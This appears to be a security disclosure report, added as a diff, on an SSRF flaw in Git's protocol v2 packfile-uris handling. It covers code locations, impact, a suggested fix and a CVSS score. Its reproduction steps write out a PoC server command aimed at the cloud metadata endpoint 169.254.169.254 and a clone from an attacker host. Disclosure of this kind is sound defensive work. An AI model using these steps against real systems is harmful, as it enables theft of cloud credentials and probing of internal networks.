@@ -1,0 +1,111 @@
+Subject: Protocol v2 packfile-uri SSRF via unvalidated server-supplied URIs
+
+Hi <security-team>,
+
+A malicious Git server forces the client to issue HTTP/HTTPS/FTP requests
+to arbitrary attacker-chosen URLs during clone/fetch. The server injects
+URIs into the protocol v2 "packfile-uris" response section. The client
+processes these URIs unconditionally -- no capability negotiation check,
+no scheme or host validation -- and spawns http-fetch against each one.
+An attacker who controls (or impersonates) a server obtains SSRF from
+every victim who clones or fetches from it.
+
+
+THREE SUB-ISSUES
+================
+
+1. No capability guard on response processing (fetch-pack.c:1800)
+
+   The client sends the "packfile-uris" capability only when the config
+   key fetch.uriProtocols is set (fetch-pack.c:1389-1406). By default
+   this key is unset, so the client never requests the feature. However,
+   the response parser at line 1800 calls
+   process_section_header(&reader, "packfile-uris", 1) with peek=1,
+   which processes the section if present in the server response
+   regardless of whether the client requested it. A malicious server
+   includes the section unconditionally.
+
+2. No URI validation (fetch-pack.c:1617-1630)
+
+   receive_packfile_uris() validates only the wire format: 40 hex
+   characters, a space, then the URI string. It performs zero validation
+   on the URI scheme, host, port, or path. The URI is passed directly
+   to http-fetch at line 1842 via strvec_push(&cmd.args, uri).
+   Any scheme accepted by get_curl_allowed_protocols() works: HTTP,
+   HTTPS, FTP, FTPS.
+
+3. Self-authenticated hash check (fetch-pack.c:1867-1871)
+
+   After http-fetch retrieves the pack, the client compares the pack
+   hash against the hash the server supplied on the same packfile-uris
+   line. Since the attacker controls both the URI and the expected hash,
+   this check provides no integrity protection.
+
+
+IMPACT
+======
+
+- Cloud metadata theft: the client issues GET requests to
+  http://169.254.169.254/latest/meta-data/ (AWS), the GCP metadata
+  endpoint, or the Azure IMDS.
+
+- Internal service probing: the client reaches localhost services
+  and RFC 1918 hosts unreachable from the internet.
+
+The attack requires no authentication and no special client
+configuration. A plain "git clone git://attacker/repo" with default
+settings triggers the SSRF.
+
+Additional amplifying factors:
+- Redirects followed: CURLOPT_MAXREDIRS is set to 20 (http.c:1143).
+- Response body written to .git/objects/pack/ on disk.
+- HTTP, HTTPS, FTP, and FTPS all permitted.
+
+
+REPRODUCTION
+============
+
+1. Start the PoC server:
+
+   python3 poc-ssrf.py \
+     --port 9418 \
+     --target-url http://169.254.169.254/latest/meta-data/
+
+2. From the victim machine:
+
+   git clone git://attacker-host:9418/test
+
+3. The git client output confirms the outbound request:
+   fatal: failed to get 'http' url from '169.254.169.254'
+
+
+SUGGESTED FIX
+=============
+
+1. Guard response processing: reject the packfile-uris section if the
+   client did not send the capability. Add a boolean flag set at line
+   1403, check before line 1800.
+
+2. Validate URI scheme: restrict to HTTPS only by default.
+
+3. Validate URI host: reject URIs whose host does not match the
+   server's hostname. Block link-local, loopback, and RFC 1918 ranges.
+
+
+CVSS
+====
+
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N  --  8.2 (HIGH)
+
+- AV:N  -- attacker hosts a reachable server
+- AC:L  -- no race, no special config, default settings
+- PR:N  -- no authentication needed
+- UI:R  -- victim runs git clone (routine operation)
+- S:C   -- impact crosses into victim's internal network
+- C:H   -- cloud metadata, internal service data exposed
+- I:L   -- attacker data written to victim filesystem
+- A:N   -- no availability impact
+
+PoC attached.
+
+Credit: <researcher-name> - <researcher-email>
